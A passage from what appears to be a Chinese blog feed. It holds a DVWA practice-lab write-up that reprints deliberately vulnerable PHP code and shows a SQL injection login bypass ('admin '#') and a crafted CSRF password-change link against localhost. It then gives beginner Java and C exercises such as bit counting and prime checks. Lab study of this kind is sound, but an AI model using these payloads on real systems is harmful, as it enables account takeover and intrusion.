class="headerlink" title="开始攻击"></a>开始攻击</h4><p><img src="https://img1.imgtp.com/2023/07/21/Usra4aGp.png" alt="7.png"></p><h4 id="分析内容，得到结果"><a href="#分析内容，得到结果" class="headerlink" title="分析内容，得到结果"></a>分析内容，得到结果</h4><p><img src="https://img1.imgtp.com/2023/07/21/Y5cdzZ6s.png" alt="8.png"></p><h3 id="方法二：SQL注入"><a href="#方法二：SQL注入" class="headerlink" title="方法二：SQL注入"></a>方法二：SQL注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>通过观察上面的代码可以发现在下面语句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以通过admin ‘#绕过</p><p><img src="https://img1.imgtp.com/2023/07/21/CJFqwv9N.png" alt="9.png"></p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令注入,是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><p>源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-string-stristr.html">PHP stristr()函数</a><br><a href="https://www.php.net/manual/zh/function.php-uname.php">PHP php_uname()函数</a><br>ping -c 4 这里的4是指设置完成要求回应的次数。</p><p><img src="https://img1.imgtp.com/2023/07/21/0F3N7LJr.png" alt="1689930000890.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造漏洞</p><p>本质就是在不知情的情况下执行请求<br>GET和POST俩种类型<br>主要是看抓包能不能抓到参数并且修改</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里可以通过构造链接的方法：<br><a href="http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成123456<br><img src="https://s2.loli.net/2023/07/23/T9NcIxyGHjvKJrQ.png" alt="image.png"><br>但这种连接容易被人看出来，也可以通过写一个简单的html页面来攻击<br>因为前面改了123456所以这里用password<br>这时用123456来登陆就不行了<br><img src="https://s2.loli.net/2023/07/23/GRE7Hk1uzSTVPYo.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java随笔</title>
      <link href="/2023/05/29/java%E9%9A%8F%E7%AC%94/"/>
      <url>/2023/05/29/java%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<h1 id="和1与，看是否为0，判断32次"><a href="#和1与，看是否为0，判断32次" class="headerlink" title="和1与，看是否为0，判断32次"></a>和1与，看是否为0，判断32次</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a &amp; <span class="number">1</span> == <span class="number">1</span>)</span><br><span class="line">count++;</span><br><span class="line">a = a &gt;&gt; <span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((a &amp; <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">               count++;</span><br><span class="line">       a &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       sc.close();</span><br><span class="line">       System.out.println(<span class="string">&quot;1的个数为 &quot;</span> + count);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//另一种写法</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">15</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> ((n &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">               cc++;</span><br><span class="line">           &#125;</span><br><span class="line">           n &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h2 id="妙妙方法"><a href="#妙妙方法" class="headerlink" title="妙妙方法"></a>妙妙方法</h2><p>一个数字与上这个数字减一的数，该数二进制最右边的1必然会消除掉，以此类推，从右往左，每一次进行按位与操作，都会取消掉一个1，直到该数字变为0，跳出循环，就得到了该数字二进制中1的个数。<br>以21(0001 0011)为例：</p><p>0001 0011</p><p>0001 0010</p><p>0001 0010 第一次与的结果 </p><p>0001 0001 </p><p>0001 0000 第二次与的结果</p><p>0000 1111</p><p>0000 0000 第三次与的结果，跳出循环，count &#x3D; 3;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (a != <span class="number">0</span>) &#123;</span><br><span class="line">a = a &amp; (a - <span class="number">1</span>);</span><br><span class="line">count++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">       n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">       ccc++;</span><br><span class="line">   &#125;</span><br><span class="line">   System.out.println(ccc);</span><br></pre></td></tr></table></figure><h1 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">       a = i % <span class="number">10</span>;</span><br><span class="line">       b = i / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">       c = i / <span class="number">100</span>;</span><br><span class="line">       <span class="keyword">if</span> (Math.pow(a, <span class="number">3</span>) + Math.pow(b, <span class="number">3</span>) + Math.pow(c, <span class="number">3</span>) == i)</span><br><span class="line">           System.out.println(i);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>; i &lt; <span class="number">999</span>; i++) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">tem1</span> <span class="operator">=</span> i;</span><br><span class="line">           <span class="keyword">while</span>(tem1 != <span class="number">0</span>) &#123;</span><br><span class="line">               tmp += Math.pow(tem1 % <span class="number">10</span>, <span class="number">3</span>);</span><br><span class="line">               tem1 /= <span class="number">10</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (tmp == i)</span><br><span class="line">               System.out.println(tmp);</span><br><span class="line">           tmp = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h2 id="拓展：一个整数的各个位数的位数次方"><a href="#拓展：一个整数的各个位数的位数次方" class="headerlink" title="拓展：一个整数的各个位数的位数次方"></a>拓展：一个整数的各个位数的位数次方</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">999999</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//记录位数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> i; <span class="comment">//保存i值，以免影响for循环</span></span><br><span class="line">            <span class="keyword">while</span> (tmp != <span class="number">0</span>) &#123;</span><br><span class="line">                tmp /= <span class="number">10</span>;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp = i;<span class="comment">//再次用来求各个位数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//保存各个位数的位数次方</span></span><br><span class="line">            <span class="keyword">while</span>( tmp != <span class="number">0</span> ) &#123;</span><br><span class="line">                sum += Math.pow(tmp % <span class="number">10</span>, count);</span><br><span class="line">                tmp /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum == i)</span><br><span class="line">                System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-30学习笔记"><a href="#5-30学习笔记" class="headerlink" title="5_30学习笔记"></a>5_30学习笔记</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 14:12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test530</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main8</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 求最大公约数 */</span></span><br><span class="line">         <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">         <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">         <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">rand</span> <span class="operator">=</span> a % b;</span><br><span class="line">         <span class="keyword">while</span>(rand != <span class="number">0</span>) &#123;</span><br><span class="line">             a = b;</span><br><span class="line">             b = rand;</span><br><span class="line">             rand = a % b;</span><br><span class="line">         &#125;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main7</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 判断素数方法2 */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (;i &lt; Math.sqrt(n); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是素数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; Math.sqrt(n)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是素数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main6</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 判断素数 */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt;= n / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是素数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; n / <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是素数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 输出整数的2进制 偶数位序列 奇数位序列 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">31</span>; i &gt;= <span class="number">1</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.print(((a &gt;&gt; i) &amp; <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//偶数位</span></span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">30</span>; i &gt;=<span class="number">1</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.print(((a &gt;&gt; i) &amp; <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//奇数位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*  输入密码 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">while</span> (count != <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入你的密码,共有&quot;</span> + count + <span class="string">&quot;次机会!&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (pass.equals(<span class="string">&quot;123&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;登陆成功&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 输出整数的每一位 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.print( n % <span class="number">10</span>);</span><br><span class="line">                n /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 乘法口诀表 */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                System.out.print(i + <span class="string">&quot;*&quot;</span> + j + <span class="string">&quot;=&quot;</span> + i * j + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* X形图案 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((i == j) || (i + j == n - <span class="number">1</span>)) &#123;</span><br><span class="line">                        System.out.print(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span 